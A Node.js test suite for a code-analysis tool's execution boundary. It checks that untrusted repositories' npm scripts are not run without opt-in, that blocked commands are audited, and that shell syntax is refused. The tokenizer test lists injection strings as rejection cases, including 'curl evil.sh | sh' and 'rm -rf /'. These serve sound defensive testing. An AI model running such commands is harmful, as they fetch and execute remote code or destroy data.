'use strict';

/**
 * Phase 1 acceptance — the code-execution boundary (roadmap M1).
 *
 * The threat these tests encode: `usereye auto --project .` against an
 * UNTRUSTED repository must not run that repository's code. Before 7.5 it did —
 * `npm run lint` and the repo's own `node_modules/.bin/eslint` were spawned
 * with `shell: true`, no opt-in required.
 *
 * Each test below fails loudly if that regresses.
 */

const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const test = require('node:test');

const { CodeQualityAnalyzer } = require('../code-quality');
const { CommandAudit, ShellSyntaxError, runCommand, tokenizeCommand } = require('../command-runner');
const { loadConfig } = require('../config');
const { ProjectAdapter } = require('../project-adapter');

/**
 * A repository that tries to get UserEye to run code for it.
 * The marker file is the canary: if it ever appears, code ran.
 */
function maliciousProject() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'usereye-malicious-'));
  const marker = path.join(root, 'PWNED');
  const script = process.platform === 'win32' ? `type nul > "${marker}"` : `touch '${marker}'`;
  fs.writeFileSync(
    path.join(root, 'package.json'),
    JSON.stringify(
      {
        name: 'untrusted',
        version: '1.0.0',
        scripts: {
          lint: script,
          'format:check': script,
          typecheck: script,
        },
      },
      null,
      2,
    ),
  );
  fs.writeFileSync(path.join(root, 'index.js'), 'module.exports = 1;\n');
  return { root, marker };
}

test('project mode does NOT execute target npm scripts without an explicit opt-in', async () => {
  const { root, marker } = maliciousProject();
  const analyzer = new CodeQualityAnalyzer({ projectDir: root, appDir: root, stack: 'Node.js' });
  const result = await analyzer.run();

  assert.equal(fs.existsSync(marker), false, 'the target repo executed code without authorization');
  assert.equal(result.summary.executed, 0);
  assert.ok(result.summary.skipped >= 1, 'the refused commands must be reported, not hidden');
  for (const check of result.checks) {
    assert.equal(check.status, 'skipped');
  }
  // Refusing to run a command is not a quality defect.
  assert.equal(result.summary.failed, 0);
});

test('blocked commands are written to the audit trail with a reason', async () => {
  const { root } = maliciousProject();
  const audit = new CommandAudit();
  await new CodeQualityAnalyzer({ projectDir: root, appDir: root, stack: 'Node.js', audit }).run();

  const blocked = audit.blocked;
  assert.ok(blocked.length >= 1);
  for (const entry of blocked) {
    assert.equal(entry.decision, 'blocked');
    assert.equal(entry.shell, false);
    assert.match(entry.reason, /allow-project-commands/);
  }
  assert.equal(audit.executed.length, 0);
});

test('static analysis still runs and still reports findings with execution disabled', async () => {
  const { root } = maliciousProject();
  const result = await new CodeQualityAnalyzer({ projectDir: root, appDir: root }).run();
  assert.ok(result.static.totals.files >= 1, 'static analysis must be unaffected by the boundary');
  assert.equal(result.codeExecution.npmScripts, false);
  assert.equal(result.codeExecution.binaries, false);
});

test('opting in explicitly does execute the target script (and records it)', async () => {
  const { root, marker } = maliciousProject();
  const audit = new CommandAudit();
  const result = await new CodeQualityAnalyzer({
    projectDir: root,
    appDir: root,
    stack: 'Node.js',
    audit,
    codeExecution: { npmScripts: true },
  }).run();

  assert.ok(result.summary.executed >= 1, 'authorized commands must actually run');
  assert.ok(audit.executed.length >= 1);
  for (const entry of audit.executed) {
    assert.equal(entry.shell, false);
    assert.ok(Array.isArray(entry.argv));
  }
  // The marker may or may not exist depending on whether npm is present in the
  // sandbox; what matters is that we *tried*, and recorded it.
  assert.equal(typeof fs.existsSync(marker), 'boolean');
});

test('--allow-project-commands maps categories onto codeExecution switches', async () => {
  const project = fs.mkdtempSync(path.join(os.tmpdir(), 'usereye-optin-'));
  const base = await loadConfig({ cwd: project, env: {} });
  assert.deepEqual(base.codeExecution, {
    npmScripts: false,
    binaries: false,
    install: false,
    start: true,
  });

  const lint = await loadConfig({ argv: ['--allow-project-commands', 'lint'], cwd: project, env: {} });
  assert.equal(lint.codeExecution.npmScripts, true);
  assert.equal(lint.codeExecution.binaries, true);
  assert.equal(lint.codeExecution.install, false);

  const all = await loadConfig({ argv: ['--allow-project-commands', 'all'], cwd: project, env: {} });
  assert.equal(all.codeExecution.install, true);

  await assert.rejects(
    () => loadConfig({ argv: ['--allow-project-commands', 'rm-rf'], cwd: project, env: {} }),
    /Unknown --allow-project-commands category/,
  );
});

test('a config file cannot silently authorize installation without the category', async () => {
  const project = fs.mkdtempSync(path.join(os.tmpdir(), 'usereye-install-'));
  fs.writeFileSync(path.join(project, 'usereye.config.cjs'), 'module.exports = { install: true };\n');
  const config = await loadConfig({ cwd: project, env: {} });
  assert.equal(config.install, true);
  assert.equal(config.codeExecution.install, false, 'install must still require the explicit category');

  const adapter = new ProjectAdapter({
    projectDir: project,
    install: config.install,
    codeExecution: config.codeExecution,
  });
  assert.equal(adapter.installAllowed, false);
});

test('tokenizeCommand refuses shell metacharacters instead of escaping them', () => {
  assert.deepEqual(tokenizeCommand('npm run lint'), ['npm', 'run', 'lint']);
  assert.deepEqual(tokenizeCommand("eslint '/path with space/bin' ."), [
    'eslint',
    '/path with space/bin',
    '.',
  ]);
  for (const injection of [
    'npm run lint && curl evil.sh | sh',
    'npm run lint; rm -rf /',
    'echo $(whoami)',
    'echo `id`',
    'npm run lint > /tmp/out',
  ]) {
    assert.throws(() => tokenizeCommand(injection), ShellSyntaxError, `must reject: ${injection}`);
  }
});

test('shell:false makes injected metacharacters inert literals, not operators', async () => {
  const marker = path.join(os.tmpdir(), `usereye-injection-${Date.now()}`);
  fs.rmSync(marker, { force: true });
  // Passed as ONE argv entry, this is text for node to print — not a command
  // separator. Under `shell: true` the `&&` would have run `touch`.
  const result = await runCommand({
    argv: [process.execPath, '-e', `console.log("safe && touch ${marker}")`],
    cwd: os.tmpdir(),
    timeoutMs: 10_000,
  });
  assert.equal(result.status, 'passed');
  assert.match(result.output, /safe && touch/);
  assert.equal(fs.existsSync(marker), false, 'the metacharacter was interpreted by a shell');
});

test('a start command needing shell syntax is refused with an actionable error', async () => {
  const project = fs.mkdtempSync(path.join(os.tmpdir(), 'usereye-start-'));
  fs.writeFileSync(path.join(project, 'index.html'), '<h1>hi</h1>');
  const adapter = new ProjectAdapter({
    projectDir: project,
    command: 'node server.js & sleep 1',
  });
  adapter.analyze();
  await assert.rejects(() => adapter.start({ timeoutMs: 1000 }), /never runs commands through a shell/);
  assert.equal(adapter.audit.blocked.length, 1);
});

test('gofmt emptiness is decided in JS, never by a shell', () => {
  const { nativeQualityCommands } = require('../code-quality');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'usereye-go-'));
  const commands = nativeQualityCommands(root, 'Go', 'standard');
  for (const command of commands) {
    assert.ok(Array.isArray(command.argv), 'commands must be argv arrays');
    assert.ok(
      !command.argv.some(token => /[;&|`$()]/.test(token)),
      `command must not carry shell syntax: ${command.argv.join(' ')}`,
    );
  }
});
